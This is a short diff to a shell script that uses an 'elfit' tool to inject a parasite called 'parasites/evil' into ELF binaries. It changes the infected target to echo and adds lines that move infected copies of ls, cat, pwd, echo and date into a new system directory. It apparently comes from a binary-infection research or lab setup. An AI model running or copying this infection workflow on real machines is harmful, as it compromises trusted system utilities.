@@ -18,8 +18,13 @@ echo " #Infecting pwd" >> output
 echo "" >> output
 
 echo " #Infecting echo" >> output
-./elfit -p parasites/evil -t --start-main init ls >> output
+./elfit -p parasites/evil -t --start-main init echo >> output
 echo "" >> output
+
+mkdir /usr/special/bin
+mv ls cat pwd echo date /usr/special/bin
+
+
 
 
 
